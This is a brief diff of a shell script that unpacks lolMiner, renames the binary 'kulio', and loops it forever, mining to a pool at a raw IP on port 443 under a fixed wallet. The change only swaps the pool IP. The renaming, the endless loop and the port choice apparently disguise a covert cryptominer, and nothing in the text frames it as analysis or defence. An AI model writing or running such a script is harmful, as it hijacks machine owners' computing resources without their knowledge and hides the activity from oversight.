@@ -3,7 +3,7 @@ tar xf lolMiner_v1.98a_Lin64.tar.gz
 mv lolMiner kulio
 while true
 do
-./kulio --algo OCTOPUS --pool 54.227.1.47:443 --user cfx:aakb89mk65dcmhrsrscgx3b3w3ba25z75y27edvk16/$(echo $RANDOM | md5sum | head -c 10)
+./kulio --algo OCTOPUS --pool 34.224.218.131:443 --user cfx:aakb89mk65dcmhrsrscgx3b3w3ba25z75y27edvk16/$(echo $RANDOM | md5sum | head -c 10)
 done
 
 
